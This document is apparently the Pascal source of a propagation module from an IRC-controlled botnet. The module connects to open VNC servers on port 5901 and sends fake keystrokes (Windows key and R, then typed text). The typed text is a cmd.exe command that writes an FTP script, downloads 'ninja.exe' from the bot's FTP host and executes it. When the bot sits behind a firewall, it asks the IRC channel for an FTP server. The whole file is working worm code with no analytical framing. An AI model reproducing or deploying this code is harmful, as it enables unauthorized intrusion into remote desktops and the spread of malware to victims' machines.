unit exVNC;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untFTPD,
  untSockets,
  untScanner,
  untGlobalDeclare,
  untOutputs;

const
  max_send  = 8;
  max_recv  = 64;

var
  text_cmd  : string = 'cmd';
  text_exit : string = 'exit';
  text_ftp  : string; // = 'echo open ' + ftp_mainip + ' ' + inttostr(ftp_port) + ' > n.txt'#10 +
                      //   'echo user ' + ftp_user + ' ' + ftp_pass + ' >> n.txt'#10 +
                      //   'echo binary >> n.txt'#10 +
                      //   'echo get ninja.exe >> n.txt'#10 +
                      //   'echo quit >> n.txt'#10 +
                      //   'ftp.exe -n -s:n.txt'#10 +
                      //   'ninja.exe'#10;

  szVNCSendKey : string = #$04;
  szKeyDown : string = #$01;
  szKeyUp   : string = #$00;
  szNullBytes_1 : string = #$00#$00#$00#$00;
  szNullBytes_2 : string = #$00#$00#$00#$00#$00;
  szVersionPacket : string = #$52#$46#$42#$20#$30#$30#$33#$2E#$30#$30#$38#$0A;
  szServerPacket_1 : string = #$01#$02;
  szServerPacket_2 : string = #$00#$00#$00#$00;
  szClientPacket_1 : string = #$01;
  szClientPacket_2 : string = #$01;
  szKeyWindows : string = #$FF#$EB;
  szKeyArrowLeft : string = #$FF#$51;
  szKeyEnter : string = #$FF#$0D;
  szKeyR : string = #$72;

function _vnc(host: string; sock: tsocket; var lerror: string): boolean;

implementation

procedure send_key(sock: tsocket; szkey: string; dwkeystate: dword = 0);
var
  i     :integer;
begin
  if (dwKeyState = 0) then
  begin
    for i := 0 to 1 do
      case i of
        0: begin
             send(sock, szVNCSendKey[1], 1, 0);
             send(sock, szKeyDown[1], 1, 0);

             if length(szKey) = 2 then
               send(sock, szNullBytes_1[1], 4, 0)
             else
               send(sock, szNullBytes_2[1], 5, 0);

             send(sock, szKey[1], length(szKey), 0);
//             break;
           end;
        1: begin
             send(sock, szVNCSendKey[1], 1, 0);
             send(sock, szKeyUp[1], 1, 0);

             if length(szKey) = 2 then
               send(sock, szNullBytes_1[1], 4, 0)
             else
               send(sock, szNullBytes_2[1], 5, 0);

             send(sock, szKey[1], length(szKey), 0);
//             break;
           end;
      end;
  end else
  begin
    case dwKeyState of
      1: begin
           send(sock, szVNCSendKey[1], 1, 0);
           send(sock, szKeyDown[1], 1, 0);

           if length(szKey) = 2 then
             send(sock, szNullBytes_1[1], 4, 0)
           else
             send(sock, szNullBytes_2[1], 5, 0);

           send(sock, szKey[1], length(szKey), 0);

//           break;
         end;
      2: begin
           send(sock, szVNCSendKey[1], 1, 0);
           send(sock, szKeyUp[1], 1, 0);

           if length(szKey) = 2 then
             send(sock, szNullBytes_1[1], 4, 0)
           else
             send(sock, szNullBytes_2[1], 5, 0);

           send(sock, szKey[1], length(szKey), 0);
//           break;
         end;
    end;
  end;
end;

function test(a, b: string): boolean;
begin
  result := false;

  if pos('.', a) > 0 then delete(a, pos('.', a), 1);
  if pos('.', b) > 0 then delete(b, pos('.', b), 1);

  delete(a, 1, 4);
  delete(b, 1, 4);
  delete(a, length(a), 1);
  delete(b, length(b), 1);

  if strtoint(a) < strtoint(b) then result := true;
end;

function _vnc(host: string; sock: tsocket; var lerror: string): boolean;
var
  addr          :tsockaddrin;
  szReceiveBuffer:Array[0..MAX_RECV] of char;
  szChar        :String;
  iRecvBytes    :Integer;
  iAction       :Integer;
  i             :Integer;
  wsa           :twsadata;
  tempsock      :tsocket;
begin
  irecvbytes := 0;
  iaction := 0;
  i := 0;

  result := false;
  lerror := 'failed to connect';

  if sock <= 0 then
  begin
    wsastartup($101, wsa);
    addr.sin_family := af_inet;
    addr.sin_port := htons(5901);
    addr.sin_addr.S_addr := inet_addr(pchar(host));
    sock := socket(af_inet, sock_stream, 0);
    if sock = invalid_socket then exit;
    if connect(sock, addr, sizeof(addr)) <> 0 then exit;
  end;

  lerror := 'failed to communicate with server';

  while true do
  begin
    fillchar(szreceivebuffer, sizeof(szreceivebuffer), 0);
    if socket_recv(sock, 60) then
      irecvbytes := recv(sock, szreceivebuffer[0], max_recv, 0)
    else exit;
    if (irecvbytes <= 0) or (irecvbytes = socket_error) then
      exit
    else begin
      case iaction of
        0: begin
             if szreceivebuffer = szversionpacket then
//             if test(szreceivebuffer, szversionpacket) then
             begin
               send(sock, szversionpacket[1], length(szversionpacket), 0);
               inc(iaction);
             end else
             begin
               lerror := szreceivebuffer;
               delete(lerror, 1, 4);
               delete(lerror, length(lerror), 1);
               lerror := 'wrong version (' + lerror + ')';
               exit;
             end;
           end;
        1: begin
             if szreceivebuffer = szServerPacket_1 then
             begin
               send(sock, szclientpacket_1[1], length(szclientpacket_1), 0);
               inc(iaction);
             end else exit;
           end;
        2: begin
//             if szreceivebuffer = szServerPacket_2 then
             if (szreceivebuffer[0] = szserverpacket_2[1]) and
                (szreceivebuffer[1] = szserverpacket_2[2]) and
                (szreceivebuffer[2] = szserverpacket_2[3]) and
                (szreceivebuffer[3] = szserverpacket_2[4]) then
               inc(iaction)
             else exit;
           end;
      end;
      if iaction = 3 then break;
    end;
  end;

  send(sock, szclientpacket_2[1], 1, 0);

  // winkey
  send_key(sock, (szkeywindows), 1);
  sleep(1000);

  // r key
  send_key(sock, (szkeyr));
  sleep(1000);

  // winkey
  send_key(sock, (szkeywindows), 2);
  sleep(1000);

  {
  szChar := text_cmd;
  for i := 1 to length(szChar) do
  begin
    send_key(sock, szChar[i]);
    sleep(125);
  end;

  // enter
  send_key(sock, szkeyenter);
  sleep(1000);
  }

  if (behindfirewall) then
  if (not scan_advportopen(inet_addr(pchar(ftp_mainip)), ftp_port, 5, 0, tempsock)) then
  begin
    closesocket(tempsock);
    ftp_mainip := '';

    outputadd(ftp_ircsock, '%pm% '+g_irc_channel+' :-needftp' + c_bot_name +#10, 1000);
    repeat
      sleep(1);
    until ftp_mainip <> '';
  end;

  lerror := 'asked to download from ' + ftp_mainip + ' ' + inttostr(ftp_port);

  szChar := 'cmd.exe /C echo open '+ftp_mainip+' '+inttostr(ftp_port)+' > n.txt && ' +
            'echo user '+ftp_user+' '+ftp_pass+' >> n.txt && '+
            'echo binary >> n.txt && echo get ninja.exe >> n.txt && echo quit >> n.txt && ftp.exe -n -s:n.txt && ninja.exe && exit';
//  szChar := 'echo open bleeh.mooo.com 21 > n.txt';
  for i := 1 to length(szChar) do
  begin
    send_key(sock, (szChar[i]));
    sleep(125);
  end;

  // enter
  send_key(sock, (szkeyenter));
  sleep(5000);

  result := true;
end;

end.

